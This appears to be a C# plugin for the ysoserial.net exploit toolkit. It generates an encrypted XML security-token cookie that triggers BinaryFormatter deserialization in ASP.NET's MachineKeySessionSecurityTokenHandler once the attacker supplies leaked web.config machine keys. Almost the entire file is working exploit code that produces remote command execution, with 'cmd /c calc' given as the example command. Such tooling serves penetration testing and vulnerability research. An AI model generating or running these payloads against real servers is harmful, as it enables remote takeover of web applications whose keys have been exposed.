using System.Collections.Generic;
using NDesk.Options;
using System;
using ysoserial.Generators;
using System.IdentityModel;
using ysoserial.Helpers;


/**
 * Author: L@2uR1te (@2308652512)
 * 
  * Comments: 
 *  This plugin is based on the existing SessionSecurityTokenHandler plugin.
 *  See `MachineKeySessionSecurityTokenHandler`: https://learn.microsoft.com/zh-cn/dotnet/api/system.identitymodel.services.tokens.machinekeysessionsecuritytokenhandler?view=netframework-4.8.1 
 *  This PoC uses BinaryFormatter from TypeConfuseDelegate
 *  The Ysoserial.net tool includes an exploit plugin for the SessionSecurityTokenHandler security issue. However, due to the fact that SessionSecurityTokenHandler employs DPAPI for encryption and decryption, it is often difficult to exploit in most cases.
 *  Nevertheless, Microsoft's documentation on SessionSecurityTokenHandler mentions that for web scenarios requiring a similar security mechanism, one can use the MachineKeySessionSecurityTokenHandler.
 *  This class inherits from SessionSecurityTokenHandler and shares similar characteristics. The key difference is that MachineKeySessionSecurityTokenHandler utilizes MachineKey configuration information for encryption and decryption operations.
 *  Therefore, as long as the MachineKey configuration information can be obtained (for instance, through a web.config leak), it may be possible to exploit it, making it more susceptible to exploitation compared to SessionSecurityTokenHandler.
 *  This PoC produces an error and may crash the application
**/

namespace ysoserial.Plugins
{
    public class MachineKeySessionSecurityTokenHandlerPlugin : IPlugin
    {
        static string command = "";
        static bool test = false;
        static bool minify = false;
        static bool useSimpleType = true;
        static string validationKey = "";
        static string decryptionKey = "";
        static string validationAlg = "HMACSHA1";
        static string decryptionAlg = "AES";
        static string[] purposes = { "System.IdentityModel.Services.MachineKeyTransform" };

        static OptionSet options = new OptionSet()
            {
                {"c|command=", "the command to be executed e.g. \"cmd /c calc\"", v => command = v },
                {"t|test", "In this scenario, the test mode should not be applied, as the sink point relies on the web environment. Default: false", v => test =  v != null },
                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
                {"vk|validationkey=", "Enter the validationKey from the web.config", v => validationKey = v },
                {"ek|decryptionkey=", "Enter the decryptionKey from the web.config", v => decryptionKey = v },
                {"va|validationalg=", "Enter the validation from the web.config. Default: HMACSHA1. e.g: HMACSHA1/HMACSHA256/HMACSHA384/HMACSHA512", v => validationAlg = v },
                {"da|decryptionalg=", "Enter the decryption from the web.config. Default: AES. e.g: AES/DES/3DES", v => decryptionAlg = v }
            };

        public string Name()
        {
            return "MachineKeySessionSecurityTokenHandler";
        }

        public string Description()
        {
            return "Generates XML payload for the MachineKeySessionSecurityTokenHandler class";
        }

        public string Credit()
        {
            return "L@2uR1te";
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            InputArgs inputArgs = new InputArgs();
            List<string> extra;
            try
            {
                extra = options.Parse(args);
                inputArgs.Cmd = command;
                inputArgs.Minify = minify;
                inputArgs.UseSimpleType = useSimpleType;
                inputArgs.Test = test;
            }
            catch (OptionException e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                System.Environment.Exit(-1);
            }

            string payload = @"<SecurityContextToken xmlns='http://schemas.xmlsoap.org/ws/2005/02/sc'>
	<Identifier xmlns='http://schemas.xmlsoap.org/ws/2005/02/sc'>
		urn:unique-id:securitycontext:1
	</Identifier>
	<Cookie xmlns='http://schemas.microsoft.com/ws/2006/05/security'>{0}</Cookie>
</SecurityContextToken>";

            if (minify)
            {
                payload = XmlHelper.Minify(payload, null, null);
            }

            if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
            {
                Console.Write("ysoserial: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                System.Environment.Exit(-1);
            }

            if (String.IsNullOrEmpty(validationKey) || String.IsNullOrWhiteSpace(validationKey) || String.IsNullOrEmpty(decryptionKey) || String.IsNullOrWhiteSpace(decryptionKey))
            {
                Console.Write("ysoserial: ");
                Console.WriteLine("validationkey or decryptionkey has not been provided correctly.");
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                System.Environment.Exit(-1);
            }

            if (validationAlg.ToUpper().Equals("SHA1"))
            {
                validationAlg = "HMACSHA1"; // MachineKeySessionSecurityTokenHandler uses HMACSHA1 instead of SHA1
            }

            byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
            DeflateCookieTransform myDeflateCookieTransform = new DeflateCookieTransform();
            MachineKeyHelper.MachineKeyDataProtector Protector = new MachineKeyHelper.MachineKeyDataProtector(validationKey, decryptionKey, decryptionAlg, validationAlg, purposes);
            byte[] deflateEncoded = myDeflateCookieTransform.Encode(serializedData);
            byte[] encryptedEncoded = Protector.Protect(deflateEncoded);
            payload = String.Format(payload, Convert.ToBase64String(encryptedEncoded));


            if (minify)
            {
                payload = XmlHelper.Minify(payload, null, null);
            }

            if (test)
            {
                // PoC on how it works in practice
                try
                {
                    //XmlReader tokenXML = XmlReader.Create(new StringReader(payload));
                    //MachineKeySessionSecurityTokenHandler myMachineKeySessionSecurityTokenHandler = new MachineKeySessionSecurityTokenHandler();
                    //myMachineKeySessionSecurityTokenHandler.ReadToken(tokenXML);
                    Console.WriteLine("In this scenario, the test mode should not be applied, as the sink point relies on the web environment.");
                    Console.WriteLine("The comments in the MachineKeySessionSecurityTokenHandlerPlugin.cs file provide test code. Please run the test code in a Web environment configured with MachineKey to observe the effects of deserialization attacks.");
                }
                catch (Exception err)
                {
                    Debugging.ShowErrors(inputArgs, err);
                }
            }

            return payload;
        }
    }
}
